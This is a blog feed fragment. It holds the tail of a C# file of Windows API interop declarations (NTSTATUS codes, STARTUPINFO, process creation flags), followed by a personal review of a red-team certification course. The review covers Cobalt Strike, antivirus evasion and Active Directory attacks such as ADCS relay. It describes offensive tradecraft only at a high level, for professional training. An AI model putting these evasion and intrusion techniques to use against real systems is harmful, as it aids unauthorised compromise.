</span></span><span style="display:flex;"><span>			IntegerOverflow = <span style="color:#ae81ff">0xc0000095</span>,
</span></span><span style="display:flex;"><span>			PrivilegedInstruction = <span style="color:#ae81ff">0xc0000096</span>,
</span></span><span style="display:flex;"><span>			TooManyPagingFiles = <span style="color:#ae81ff">0xc0000097</span>,
</span></span><span style="display:flex;"><span>			FileInvalid = <span style="color:#ae81ff">0xc0000098</span>,
</span></span><span style="display:flex;"><span>			InsufficientResources = <span style="color:#ae81ff">0xc000009a</span>,
</span></span><span style="display:flex;"><span>			InstanceNotAvailable = <span style="color:#ae81ff">0xc00000ab</span>,
</span></span><span style="display:flex;"><span>			PipeNotAvailable = <span style="color:#ae81ff">0xc00000ac</span>,
</span></span><span style="display:flex;"><span>			InvalidPipeState = <span style="color:#ae81ff">0xc00000ad</span>,
</span></span><span style="display:flex;"><span>			PipeBusy = <span style="color:#ae81ff">0xc00000ae</span>,
</span></span><span style="display:flex;"><span>			IllegalFunction = <span style="color:#ae81ff">0xc00000af</span>,
</span></span><span style="display:flex;"><span>			PipeDisconnected = <span style="color:#ae81ff">0xc00000b0</span>,
</span></span><span style="display:flex;"><span>			PipeClosing = <span style="color:#ae81ff">0xc00000b1</span>,
</span></span><span style="display:flex;"><span>			PipeConnected = <span style="color:#ae81ff">0xc00000b2</span>,
</span></span><span style="display:flex;"><span>			PipeListening = <span style="color:#ae81ff">0xc00000b3</span>,
</span></span><span style="display:flex;"><span>			InvalidReadMode = <span style="color:#ae81ff">0xc00000b4</span>,
</span></span><span style="display:flex;"><span>			IoTimeout = <span style="color:#ae81ff">0xc00000b5</span>,
</span></span><span style="display:flex;"><span>			FileForcedClosed = <span style="color:#ae81ff">0xc00000b6</span>,
</span></span><span style="display:flex;"><span>			ProfilingNotStarted = <span style="color:#ae81ff">0xc00000b7</span>,
</span></span><span style="display:flex;"><span>			ProfilingNotStopped = <span style="color:#ae81ff">0xc00000b8</span>,
</span></span><span style="display:flex;"><span>			NotSameDevice = <span style="color:#ae81ff">0xc00000d4</span>,
</span></span><span style="display:flex;"><span>			FileRenamed = <span style="color:#ae81ff">0xc00000d5</span>,
</span></span><span style="display:flex;"><span>			CantWait = <span style="color:#ae81ff">0xc00000d8</span>,
</span></span><span style="display:flex;"><span>			PipeEmpty = <span style="color:#ae81ff">0xc00000d9</span>,
</span></span><span style="display:flex;"><span>			CantTerminateSelf = <span style="color:#ae81ff">0xc00000db</span>,
</span></span><span style="display:flex;"><span>			InternalError = <span style="color:#ae81ff">0xc00000e5</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter1 = <span style="color:#ae81ff">0xc00000ef</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter2 = <span style="color:#ae81ff">0xc00000f0</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter3 = <span style="color:#ae81ff">0xc00000f1</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter4 = <span style="color:#ae81ff">0xc00000f2</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter5 = <span style="color:#ae81ff">0xc00000f3</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter6 = <span style="color:#ae81ff">0xc00000f4</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter7 = <span style="color:#ae81ff">0xc00000f5</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter8 = <span style="color:#ae81ff">0xc00000f6</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter9 = <span style="color:#ae81ff">0xc00000f7</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter10 = <span style="color:#ae81ff">0xc00000f8</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter11 = <span style="color:#ae81ff">0xc00000f9</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter12 = <span style="color:#ae81ff">0xc00000fa</span>,
</span></span><span style="display:flex;"><span>			ProcessIsTerminating = <span style="color:#ae81ff">0xc000010a</span>,
</span></span><span style="display:flex;"><span>			MappedFileSizeZero = <span style="color:#ae81ff">0xc000011e</span>,
</span></span><span style="display:flex;"><span>			TooManyOpenedFiles = <span style="color:#ae81ff">0xc000011f</span>,
</span></span><span style="display:flex;"><span>			Cancelled = <span style="color:#ae81ff">0xc0000120</span>,
</span></span><span style="display:flex;"><span>			CannotDelete = <span style="color:#ae81ff">0xc0000121</span>,
</span></span><span style="display:flex;"><span>			InvalidComputerName = <span style="color:#ae81ff">0xc0000122</span>,
</span></span><span style="display:flex;"><span>			FileDeleted = <span style="color:#ae81ff">0xc0000123</span>,
</span></span><span style="display:flex;"><span>			SpecialAccount = <span style="color:#ae81ff">0xc0000124</span>,
</span></span><span style="display:flex;"><span>			SpecialGroup = <span style="color:#ae81ff">0xc0000125</span>,
</span></span><span style="display:flex;"><span>			SpecialUser = <span style="color:#ae81ff">0xc0000126</span>,
</span></span><span style="display:flex;"><span>			MembersPrimaryGroup = <span style="color:#ae81ff">0xc0000127</span>,
</span></span><span style="display:flex;"><span>			FileClosed = <span style="color:#ae81ff">0xc0000128</span>,
</span></span><span style="display:flex;"><span>			TooManyThreads = <span style="color:#ae81ff">0xc0000129</span>,
</span></span><span style="display:flex;"><span>			ThreadNotInProcess = <span style="color:#ae81ff">0xc000012a</span>,
</span></span><span style="display:flex;"><span>			TokenAlreadyInUse = <span style="color:#ae81ff">0xc000012b</span>,
</span></span><span style="display:flex;"><span>			PagefileQuotaExceeded = <span style="color:#ae81ff">0xc000012c</span>,
</span></span><span style="display:flex;"><span>			CommitmentLimit = <span style="color:#ae81ff">0xc000012d</span>,
</span></span><span style="display:flex;"><span>			InvalidImageLeFormat = <span style="color:#ae81ff">0xc000012e</span>,
</span></span><span style="display:flex;"><span>			InvalidImageNotMz = <span style="color:#ae81ff">0xc000012f</span>,
</span></span><span style="display:flex;"><span>			InvalidImageProtect = <span style="color:#ae81ff">0xc0000130</span>,
</span></span><span style="display:flex;"><span>			InvalidImageWin16 = <span style="color:#ae81ff">0xc0000131</span>,
</span></span><span style="display:flex;"><span>			LogonServer = <span style="color:#ae81ff">0xc0000132</span>,
</span></span><span style="display:flex;"><span>			DifferenceAtDc = <span style="color:#ae81ff">0xc0000133</span>,
</span></span><span style="display:flex;"><span>			SynchronizationRequired = <span style="color:#ae81ff">0xc0000134</span>,
</span></span><span style="display:flex;"><span>			DllNotFound = <span style="color:#ae81ff">0xc0000135</span>,
</span></span><span style="display:flex;"><span>			IoPrivilegeFailed = <span style="color:#ae81ff">0xc0000137</span>,
</span></span><span style="display:flex;"><span>			OrdinalNotFound = <span style="color:#ae81ff">0xc0000138</span>,
</span></span><span style="display:flex;"><span>			EntryPointNotFound = <span style="color:#ae81ff">0xc0000139</span>,
</span></span><span style="display:flex;"><span>			ControlCExit = <span style="color:#ae81ff">0xc000013a</span>,
</span></span><span style="display:flex;"><span>			InvalidAddress = <span style="color:#ae81ff">0xc0000141</span>,
</span></span><span style="display:flex;"><span>			PortNotSet = <span style="color:#ae81ff">0xc0000353</span>,
</span></span><span style="display:flex;"><span>			DebuggerInactive = <span style="color:#ae81ff">0xc0000354</span>,
</span></span><span style="display:flex;"><span>			CallbackBypass = <span style="color:#ae81ff">0xc0000503</span>,
</span></span><span style="display:flex;"><span>			PortClosed = <span style="color:#ae81ff">0xc0000700</span>,
</span></span><span style="display:flex;"><span>			MessageLost = <span style="color:#ae81ff">0xc0000701</span>,
</span></span><span style="display:flex;"><span>			InvalidMessage = <span style="color:#ae81ff">0xc0000702</span>,
</span></span><span style="display:flex;"><span>			RequestCanceled = <span style="color:#ae81ff">0xc0000703</span>,
</span></span><span style="display:flex;"><span>			RecursiveDispatch = <span style="color:#ae81ff">0xc0000704</span>,
</span></span><span style="display:flex;"><span>			LpcReceiveBufferExpected = <span style="color:#ae81ff">0xc0000705</span>,
</span></span><span style="display:flex;"><span>			LpcInvalidConnectionUsage = <span style="color:#ae81ff">0xc0000706</span>,
</span></span><span style="display:flex;"><span>			LpcRequestsNotAllowed = <span style="color:#ae81ff">0xc0000707</span>,
</span></span><span style="display:flex;"><span>			ResourceInUse = <span style="color:#ae81ff">0xc0000708</span>,
</span></span><span style="display:flex;"><span>			ProcessIsProtected = <span style="color:#ae81ff">0xc0000712</span>,
</span></span><span style="display:flex;"><span>			VolumeDirty = <span style="color:#ae81ff">0xc0000806</span>,
</span></span><span style="display:flex;"><span>			FileCheckedOut = <span style="color:#ae81ff">0xc0000901</span>,
</span></span><span style="display:flex;"><span>			CheckOutRequired = <span style="color:#ae81ff">0xc0000902</span>,
</span></span><span style="display:flex;"><span>			BadFileType = <span style="color:#ae81ff">0xc0000903</span>,
</span></span><span style="display:flex;"><span>			FileTooLarge = <span style="color:#ae81ff">0xc0000904</span>,
</span></span><span style="display:flex;"><span>			FormsAuthRequired = <span style="color:#ae81ff">0xc0000905</span>,
</span></span><span style="display:flex;"><span>			VirusInfected = <span style="color:#ae81ff">0xc0000906</span>,
</span></span><span style="display:flex;"><span>			VirusDeleted = <span style="color:#ae81ff">0xc0000907</span>,
</span></span><span style="display:flex;"><span>			TransactionalConflict = <span style="color:#ae81ff">0xc0190001</span>,
</span></span><span style="display:flex;"><span>			InvalidTransaction = <span style="color:#ae81ff">0xc0190002</span>,
</span></span><span style="display:flex;"><span>			TransactionNotActive = <span style="color:#ae81ff">0xc0190003</span>,
</span></span><span style="display:flex;"><span>			TmInitializationFailed = <span style="color:#ae81ff">0xc0190004</span>,
</span></span><span style="display:flex;"><span>			RmNotActive = <span style="color:#ae81ff">0xc0190005</span>,
</span></span><span style="display:flex;"><span>			RmMetadataCorrupt = <span style="color:#ae81ff">0xc0190006</span>,
</span></span><span style="display:flex;"><span>			TransactionNotJoined = <span style="color:#ae81ff">0xc0190007</span>,
</span></span><span style="display:flex;"><span>			DirectoryNotRm = <span style="color:#ae81ff">0xc0190008</span>,
</span></span><span style="display:flex;"><span>			CouldNotResizeLog = <span style="color:#ae81ff">0xc0190009</span>,
</span></span><span style="display:flex;"><span>			TransactionsUnsupportedRemote = <span style="color:#ae81ff">0xc019000a</span>,
</span></span><span style="display:flex;"><span>			LogResizeInvalidSize = <span style="color:#ae81ff">0xc019000b</span>,
</span></span><span style="display:flex;"><span>			RemoteFileVersionMismatch = <span style="color:#ae81ff">0xc019000c</span>,
</span></span><span style="display:flex;"><span>			CrmProtocolAlreadyExists = <span style="color:#ae81ff">0xc019000f</span>,
</span></span><span style="display:flex;"><span>			TransactionPropagationFailed = <span style="color:#ae81ff">0xc0190010</span>,
</span></span><span style="display:flex;"><span>			CrmProtocolNotFound = <span style="color:#ae81ff">0xc0190011</span>,
</span></span><span style="display:flex;"><span>			TransactionSuperiorExists = <span style="color:#ae81ff">0xc0190012</span>,
</span></span><span style="display:flex;"><span>			TransactionRequestNotValid = <span style="color:#ae81ff">0xc0190013</span>,
</span></span><span style="display:flex;"><span>			TransactionNotRequested = <span style="color:#ae81ff">0xc0190014</span>,
</span></span><span style="display:flex;"><span>			TransactionAlreadyAborted = <span style="color:#ae81ff">0xc0190015</span>,
</span></span><span style="display:flex;"><span>			TransactionAlreadyCommitted = <span style="color:#ae81ff">0xc0190016</span>,
</span></span><span style="display:flex;"><span>			TransactionInvalidMarshallBuffer = <span style="color:#ae81ff">0xc0190017</span>,
</span></span><span style="display:flex;"><span>			CurrentTransactionNotValid = <span style="color:#ae81ff">0xc0190018</span>,
</span></span><span style="display:flex;"><span>			LogGrowthFailed = <span style="color:#ae81ff">0xc0190019</span>,
</span></span><span style="display:flex;"><span>			ObjectNoLongerExists = <span style="color:#ae81ff">0xc0190021</span>,
</span></span><span style="display:flex;"><span>			StreamMiniversionNotFound = <span style="color:#ae81ff">0xc0190022</span>,
</span></span><span style="display:flex;"><span>			StreamMiniversionNotValid = <span style="color:#ae81ff">0xc0190023</span>,
</span></span><span style="display:flex;"><span>			MiniversionInaccessibleFromSpecifiedTransaction = <span style="color:#ae81ff">0xc0190024</span>,
</span></span><span style="display:flex;"><span>			CantOpenMiniversionWithModifyIntent = <span style="color:#ae81ff">0xc0190025</span>,
</span></span><span style="display:flex;"><span>			CantCreateMoreStreamMiniversions = <span style="color:#ae81ff">0xc0190026</span>,
</span></span><span style="display:flex;"><span>			HandleNoLongerValid = <span style="color:#ae81ff">0xc0190028</span>,
</span></span><span style="display:flex;"><span>			NoTxfMetadata = <span style="color:#ae81ff">0xc0190029</span>,
</span></span><span style="display:flex;"><span>			LogCorruptionDetected = <span style="color:#ae81ff">0xc0190030</span>,
</span></span><span style="display:flex;"><span>			CantRecoverWithHandleOpen = <span style="color:#ae81ff">0xc0190031</span>,
</span></span><span style="display:flex;"><span>			RmDisconnected = <span style="color:#ae81ff">0xc0190032</span>,
</span></span><span style="display:flex;"><span>			EnlistmentNotSuperior = <span style="color:#ae81ff">0xc0190033</span>,
</span></span><span style="display:flex;"><span>			RecoveryNotNeeded = <span style="color:#ae81ff">0xc0190034</span>,
</span></span><span style="display:flex;"><span>			RmAlreadyStarted = <span style="color:#ae81ff">0xc0190035</span>,
</span></span><span style="display:flex;"><span>			FileIdentityNotPersistent = <span style="color:#ae81ff">0xc0190036</span>,
</span></span><span style="display:flex;"><span>			CantBreakTransactionalDependency = <span style="color:#ae81ff">0xc0190037</span>,
</span></span><span style="display:flex;"><span>			CantCrossRmBoundary = <span style="color:#ae81ff">0xc0190038</span>,
</span></span><span style="display:flex;"><span>			TxfDirNotEmpty = <span style="color:#ae81ff">0xc0190039</span>,
</span></span><span style="display:flex;"><span>			IndoubtTransactionsExist = <span style="color:#ae81ff">0xc019003a</span>,
</span></span><span style="display:flex;"><span>			TmVolatile = <span style="color:#ae81ff">0xc019003b</span>,
</span></span><span style="display:flex;"><span>			RollbackTimerExpired = <span style="color:#ae81ff">0xc019003c</span>,
</span></span><span style="display:flex;"><span>			TxfAttributeCorrupt = <span style="color:#ae81ff">0xc019003d</span>,
</span></span><span style="display:flex;"><span>			EfsNotAllowedInTransaction = <span style="color:#ae81ff">0xc019003e</span>,
</span></span><span style="display:flex;"><span>			TransactionalOpenNotAllowed = <span style="color:#ae81ff">0xc019003f</span>,
</span></span><span style="display:flex;"><span>			TransactedMappingUnsupportedRemote = <span style="color:#ae81ff">0xc0190040</span>,
</span></span><span style="display:flex;"><span>			TxfMetadataAlreadyPresent = <span style="color:#ae81ff">0xc0190041</span>,
</span></span><span style="display:flex;"><span>			TransactionScopeCallbacksNotSet = <span style="color:#ae81ff">0xc0190042</span>,
</span></span><span style="display:flex;"><span>			TransactionRequiredPromotion = <span style="color:#ae81ff">0xc0190043</span>,
</span></span><span style="display:flex;"><span>			CannotExecuteFileInTransaction = <span style="color:#ae81ff">0xc0190044</span>,
</span></span><span style="display:flex;"><span>			TransactionsNotFrozen = <span style="color:#ae81ff">0xc0190045</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			MaximumNtStatus = <span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[StructLayout(LayoutKind.Sequential)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">UNICODE_STRING</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> UInt16 Length;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> UInt16 MaximumLength;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr Buffer;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">PROCESS_INFORMATION</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hProcess;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hThread;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwProcessId;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwThreadId;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">STARTUPINFO</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> cb;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> lpReserved;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> lpDesktop;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> lpTitle;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwX;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwY;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwXSize;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwYSize;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwXCountChars;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwYCountChars;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwFillAttribute;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> dwFlags;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> wShowWindow;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> cbReserved2;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr lpReserved2;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hStdInput;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hStdOutput;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">public</span> IntPtr hStdError;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[Flags]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">enum</span> ProcessCreationFlags : <span style="color:#66d9ef">uint</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			ZERO_FLAG = <span style="color:#ae81ff">0x00000000</span>,
</span></span><span style="display:flex;"><span>			CREATE_BREAKAWAY_FROM_JOB = <span style="color:#ae81ff">0x01000000</span>,
</span></span><span style="display:flex;"><span>			CREATE_DEFAULT_ERROR_MODE = <span style="color:#ae81ff">0x04000000</span>,
</span></span><span style="display:flex;"><span>			CREATE_NEW_CONSOLE = <span style="color:#ae81ff">0x00000010</span>,
</span></span><span style="display:flex;"><span>			CREATE_NEW_PROCESS_GROUP = <span style="color:#ae81ff">0x00000200</span>,
</span></span><span style="display:flex;"><span>			CREATE_NO_WINDOW = <span style="color:#ae81ff">0x08000000</span>,
</span></span><span style="display:flex;"><span>			CREATE_PROTECTED_PROCESS = <span style="color:#ae81ff">0x00040000</span>,
</span></span><span style="display:flex;"><span>			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = <span style="color:#ae81ff">0x02000000</span>,
</span></span><span style="display:flex;"><span>			CREATE_SEPARATE_WOW_VDM = <span style="color:#ae81ff">0x00001000</span>,
</span></span><span style="display:flex;"><span>			CREATE_SHARED_WOW_VDM = <span style="color:#ae81ff">0x00001000</span>,
</span></span><span style="display:flex;"><span>			CREATE_SUSPENDED = <span style="color:#ae81ff">0x00000004</span>,
</span></span><span style="display:flex;"><span>			CREATE_UNICODE_ENVIRONMENT = <span style="color:#ae81ff">0x00000400</span>,
</span></span><span style="display:flex;"><span>			DEBUG_ONLY_THIS_PROCESS = <span style="color:#ae81ff">0x00000002</span>,
</span></span><span style="display:flex;"><span>			DEBUG_PROCESS = <span style="color:#ae81ff">0x00000001</span>,
</span></span><span style="display:flex;"><span>			DETACHED_PROCESS = <span style="color:#ae81ff">0x00000008</span>,
</span></span><span style="display:flex;"><span>			EXTENDED_STARTUPINFO_PRESENT = <span style="color:#ae81ff">0x00080000</span>,
</span></span><span style="display:flex;"><span>			INHERIT_PARENT_AFFINITY = <span style="color:#ae81ff">0x00010000</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>]]></content></item><item><title>Certified Red Team Operator (CRTO) by Zero Point Security Review</title><link>https://jakemai0.github.io/posts/crto/</link><pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/crto/</guid><description>Introduction Red Team Ops is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of Cobalt Strike C2. When the students finish the course and pass the 48 hour exam (don&amp;rsquo;t worry, it&amp;rsquo;s not like the 300 level courses by OffSec), the students will receive the &amp;ldquo;Certified Red Team Operator&amp;rdquo; certification. If you&amp;rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka RastaMouse.</description><content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p><a href="https://courses.zeropointsecurity.co.uk/courses/red-team-ops">Red Team Ops</a> is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> C2. When the students finish the course and pass the 48 hour exam (don&rsquo;t worry, it&rsquo;s not like the 300 level courses by OffSec), the students will receive the &ldquo;Certified Red Team Operator&rdquo; certification.
If you&rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka <a href="https://twitter.com/_rastamouse?lang=en">RastaMouse</a>. He is well known in the infosec community for many of his contributions such as the open-source C2 <a href="https://github.com/SharpC2/SharpC2">SharpC2</a>, the <a href="https://app.hackthebox.com/prolabs/overview/rastalabs">RastaLabs</a> ProLab on HackTheBox, the <a href="https://courses.zeropointsecurity.co.uk/courses/c2-development-in-csharp">C2 Development in C#</a> course, the <a href="https://courses.zeropointsecurity.co.uk/courses/offensive-driver-development">Offensive Driver Development</a> course and the RTO course that I will be talking about.</p>
<p>In this post I will be going over my experience with the course and the exam, what I think about this course and whether you should be taking it or not (spoiler: yes, you should).</p>
<h2 id="my-background">My Background</h2>
<p>I am still a fresh noob when it comes to the Offensive Security domain, with less than a year of experience as a pentester at the time of writing this. I did however have prior experience working as a SOC analyst, so I joined the Red side with a hint of Blue, and this has benefited me greatly (I&rsquo;ll get to that part later). I had my OSCP and CRTP in November 2021 and January 2022 respectively, my knowledge and skills could barely scratch the surface when it comes to Pentesting/Red Teaming, but at least I consider myself somewhat competent with &ldquo;how to computer&rdquo;.
I&rsquo;ve always wanted to dive into Red Teaming and Adversary Emulation, so after CRTP, CRTO was next on my checklist.</p>
<h2 id="the-course-material-and-lab-experience">The Course Material and Lab Experience</h2>
<p>The course content was absolutely amazing, it goes over from the basic &ldquo;high level&rdquo; of what is Red Teaming, what is a C2, Reconnaissance, Initial Compromise, to full Domain Takeover.</p>
<p>I enjoyed the &ldquo;high level&rdquo; theory part of Red Teaming more than I thought I did, so I went ahead and bought the book <a href="https://www.amazon.com/Red-Team-Development-Operations-practical/dp/B083XVG633">Red Team Development and Operations</a> by Joe Vest and James Tubberville. This is an amazing book and probably a must-read if you want to get into Red Teaming.
There are 26 modules in the course so I won&rsquo;t be able to go over each of them here, but here are the highlights of the course in my opinion.</p>
<h3 id="cobalt-strike">Cobalt Strike</h3>
<p>What&rsquo;s not to love about getting your hands on one of the best C2 frameworks out there. <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> was originally created by Raphael Mudge back in 2012, it is now  maintained by Help System and is still considered to be one of the best C2 frameworks due to its powerful and robust capabilities. I&rsquo;ve never gotten a chance to use Cobalt Strike or any of the C2 framework before, so this was an eye-opening experience. Since the course focuses on the use of C2, everything you do will be via Cobalt Strike, from catching the first beacon from a macro-embedded Word doc, host privsec, lateral movement, pivoting, tunneling, to getting DA and EA.

    <img src="/images/cs.png"  alt="Cobalt Strike in action"  class="center"  style="border-radius: 8px;"  />


<em>Cobalt Strike in action</em></p>
<p>The course also touches on some basic AV Evasion for Cobalt Strike payloads, by teaching you how to modify the artifact-kit and resource-kit to bypass AV on the target machines (not EDR evasion unfortunately, RastaMouse did hint that this topic would be covered in RTO2, so I guess we&rsquo;ll see). Another cool feature of Cobalt Strike is Malleable C2 Profile, it gives the Operators total control of the beacon&rsquo;s indicators such as network and in-memory artifacts, HTTP(S) requests coming in and out, everything is fully customisable. This feature can make Cobalt Strike much harder to detect, and can also be used to emulate the TTPs of a particular APT in an Red Team Engagement.</p>
<h3 id="kibana">Kibana</h3>
<p>Ah, flashback to the SOC days. In previous verisons of the lab, Splunk was the predecessor, however, the new lab uses ELK as a mini &lsquo;SIEM&rsquo;. In my opinion, this is a great feature and a selling point for RTO. Yes, attacking a network is cool but what&rsquo;s cooler is you get to see what&rsquo;s going on on the other side of the fence, you get to see what the Blue Team Operators see. Combining with the #OPSEC tips and tricks, I got to see what event Windows generates via Kibana when you launch an attack, why is this particular technique is considered bad #OPSEC and what should you do instead to be more stealth.
I had many &ldquo;Ahhhhhh&rdquo; moments as I was going through the course and looking at the Kibana console, I&rsquo;d be lying if I say I knew 100% what each event meant and why they were there when I was a SOC analyst. But now from an attacker perspective, it all made sense. This is why I strongly believe that to be a good Red Team Operator, you also need to be a good Blue Team Analyst and vice versa. It&rsquo;s Art of War all over again, &ldquo;Knowing Your Enemy&rdquo;.

    <img src="/images/kibana.png"  alt="Kibana"  class="center"  style="border-radius: 8px;"  />


<em>Kibana console</em></p>
<p>A small issue I encountered was, sometimes, the winlogbeat sensor did not work properly on some machines and I ended up not seeing any events being ingested.</p>
<h3 id="active-directory-exploitation">Active Directory Exploitation</h3>
<p>Windows Active Directory Exploitation was the bulk of the course. I felt like CRTP was a great primer for me, without any practical AD experience before, it taught me basic understanding of AD hacking. This time, I got to do it all over again with Cobalt Strike. However, that doesn&rsquo;t mean that I didn&rsquo;t learn anything new. The AD Exploitation modules on RTO really reinforced my skills and taught me new techniques on Lateral Movement, Reverse Port Forwarding, Pivoting, DPAPI, GPO Abuses, DCAL Abuses, LAPS and Active Directory Certificate Services (ADCS).</p>
<p>The section on ADCS was absolute gold, thanks to it, I was able to compromise DA in a recent internal pentest by abusing NTLM Relay via ADCS (PetitPotam attack). I will make a detailed post on this in a few weeks.</p>
<h3 id="the-lab">The Lab</h3>
<p>The lab for RTO was hosted on SnapLab, overall, it was a smooth experience for me. Everything was done via a web portal using Guacamole Apache, you connect to the lab directly through it. All tools were provided on the attacker-machine, it was a complete sandboxed environment to protect Cobalt Strike&rsquo;s license (understandable). There was no flag to collect in the unlike the previous versions of the lab. It was designed so that you can follow a long the examples in the course material and experiment with different techniques and tactics, more like an &ldquo;Open World&rdquo; lab ;)</p>
<p>Also, the lab is private and you would not have to share it with others. Phew!</p>
<h3 id="pricing-and-support">Pricing and Support</h3>
<p>RTO was relatively cheap when you compare it to other big players in the game like Offensive Security, SANS and INE. I bought the RTO bundle including the course and 40 hours of lab time for £399 (if you buy the lab time separately, it is £1.25 per hour). I finished the course and the exam and still had about 10 hours of lab time remaning, which I still have access to. Based on what provided, this was an absolute bargain, not to mention, you have lifetime access to the course material and its future updates.</p>
<p>For support, since RastaMouse in the CEO, Content Manager, Lab Maintainer as well as Student Support Officer, he might be overwhelmed with emails and queries. RTO&rsquo;s <a href="https://discord.com/invite/FBgTXB45?utm_source=Discord%20Widget&amp;utm_medium=Connect">Discord</a> server is the place to go for real time support. You will have RastaMouse himself answering your questions, when he is unable too, you have heaps of other knowledgable members in the chat to help you out. It is also a good place for banters :)</p>
<h2 id="exam">Exam</h2>
<p>The exam was a roller coaster for me. I booked to sit the exam on Good Friday, so that I could make good use of the Easter long weekend. After booking the exam, you would receive a PDF containing the TTPs you need to emulate using Malleable C2 Profile along with customised tactical approach. The exam is a 4-day event for 48 hours (you have 48 hours to do the exam, and the result will come out after 4 days), the best thing is you can pause the exam anytime you want for breaks, 48 hours is a lot of time so make sure you eat and sleep well for a fresh mind. The final goal of the exam is to reach an external domain, and to pass you will need to collect 6/8 flags, you also don&rsquo;t need to submit a report, which is a nice change of wind.</p>
<p>My first day did not go so well, I got 2 flags in the first 4 hours, and got stuck for the next 7 hours. I thought I&rsquo;ve tried everything, I didn&rsquo;t know what I was missing. Frustrated, I went to bed, next day I spent the whole day playing Squash, had dinner with friends and played Mario Kart :&rsquo;). I think I just needed a break. Picked up where I left off on Sunday, I finally got my third flag, then fourth. &ldquo;They&rsquo;re falling like Dominoes now&rdquo; I told myself, it was all fun and games until flag 6, the passing flag. I went full r*tard and reset the firewall setting on one box, what could go wrong right? It effectively killed a very important beacon in the compromise chain, and I completely lost connection to that machine. I was pulling my hair out.</p>
<p>Oh well, I had 26 hours left, so I reverted everything and started from square one. Took me a while to get to the point I was before, and yes, I finally got flag 6 at 2am. Had a bit too much coffee by then so I tried grinding out the next 2 flags, and managed to get 8/8 at 4.30am after 20 hours straight :&rsquo;).

